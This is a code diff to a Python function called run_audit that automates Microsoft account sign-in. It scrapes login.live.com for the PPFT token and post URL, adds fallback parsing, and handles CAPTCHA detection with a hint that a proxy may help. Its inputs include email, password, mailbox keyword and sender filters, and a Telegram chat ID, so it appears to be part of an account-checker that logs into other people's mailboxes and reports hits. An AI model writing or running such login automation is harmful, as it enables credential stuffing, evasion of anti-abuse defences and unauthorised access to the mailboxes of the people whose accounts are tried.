@@ -252,21 +252,26 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
         ppft_match = re.search(r'"sFT"\s*:\s*"([^"]+)"', res1.text)
     if not ppft_match:
         ppft_match = re.search(r'PPFT[^v]*value=(?:\\"|")(.*?)(?:\\"|")', res1.text)
+    if not ppft_match:
+        # Ultimate fallback for PPFT
+        m = re.search(r'value="([-A-Za-z0-9+/=]{100,})"', res1.text)
+        if m:
+            class _FM:
+                def group(self, n): return m.group(1)
+            ppft_match = _FM()
 
     pl_match = re.search(r'urlPost\s*["\']?\s*:\s*["\']([^"\']+)["\']', res1.text)
     if not pl_match:
         pl_match = re.search(r'urlPost\s*:\s*"([^"]+)"', res1.text)
-
-    if re.search(r'captcha|hip-frame|HipChallengeUrl|arkose', res1.text, re.IGNORECASE):
-        emit_event(q, "warning", {"message": "CAPTCHA detectado — proxy puede ayudar"})
-
-    # Fallback: buscar URL de post.srf directamente
     if not pl_match:
         post_urls = re.findall(r'https://login\.live\.com/ppsecure/post\.srf[^"\'\\ ]*', res1.text)
         if post_urls:
             class _FM:
                 def group(self, n): return post_urls[0]
             pl_match = _FM()
+
+    if re.search(r'captcha|hip-frame|HipChallengeUrl|arkose', res1.text, re.IGNORECASE):
+        emit_event(q, "warning", {"message": "CAPTCHA detectado — proxy puede ayudar"})
 
     if not ppft_match or not pl_match:
         emit_event(q, "step_fail", {"step": 2, "detail": "PPFT/urlPost no encontrado"})
